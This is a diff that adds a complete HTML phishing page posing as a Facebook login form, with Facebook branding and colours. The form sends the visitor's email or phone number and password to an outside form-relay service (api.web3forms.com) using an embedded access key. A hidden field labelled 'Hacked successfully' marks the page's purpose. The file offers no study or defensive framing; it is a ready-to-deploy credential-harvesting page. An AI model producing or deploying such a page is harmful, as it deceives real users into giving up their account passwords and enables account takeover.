@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Form</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('/img/Picsart_24-08-26_07-33-34-614.jpg'); /* Background image URL */
+            background-size: cover; /* Ensures the background covers the entire screen */
+            background-position: center; /* Centers the image */
+            background-repeat: no-repeat; /* Avoids repetition */
+        }
+
+        /* Container for the form */
+        .login-container {
+            width: 300px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Cover Photo Section */
+        .cover-photo {
+            width: 100%;
+            height: 150px;
+            position: relative;
+        }
+
+        .cover-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Profile Picture Section */
+        .profile-picture {
+            position: absolute;
+            top: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            overflow: hidden;
+            border: 5px solid white;
+        }
+
+        .profile-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        /* Name Below Profile Picture */
+        .profile-name {
+            position: absolute;
+            top: 230px; /* Positioned below the profile picture */
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* Login Form */
+        .login-form {
+            padding: 20px;
+            padding-top: 100px; /* Extra padding to push form below the profile picture and name */
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            text-align: center;
+        }
+
+        .input-field {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field input {
+            width: 90%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-field input:focus {
+            outline: none;
+            border-color: #1877f2;
+        }
+
+        /* Toggle Password Eye Icon */
+        .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 25px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-btn:hover {
+            background-color: #145dbf;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Cover Photo -->
+        <div class="cover-photo">
+            <img src="/img/Picsart_24-08-25_10-07-45-476.jpg" alt="Cover Photo" class="cover-img">
+        </div>
+
+        <!-- Profile Picture -->
+        <div class="profile-picture">
+            <img src="/img/Picsart_24-08-18_18-44-11-013.jpg" alt="Profile Picture" class="profile-img">
+        </div>
+
+        <!-- Profile Name -->
+        <div class="profile-name">Facebook</div>
+
+        <!-- Login Form -->
+        <form class="login-form" id="login-form" action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
+<input type="hidden" name="Hacked successfully" >
+            <div class="input-field">
+                <input type="email or phone" id="email or phone" name="email_or_phone" placeholder="Email or phone" required>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" name="PA$$W0RD" placeholder="Password" required>
+                <span class="toggle-password" onclick="togglePassword()">🥱</span> <!-- Eye Icon -->
+            </div>
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+    </div>
+
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const passwordIcon = document.querySelector('.toggle-password');
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                passwordIcon.textContent = "😳"; // Change icon to closed eye
+            } else {
+                passwordField.type = "password";
+                passwordIcon.textContent = "😑"; // Change icon to open eye
+            }
+        }
+    </script>
+</body>
+</html>
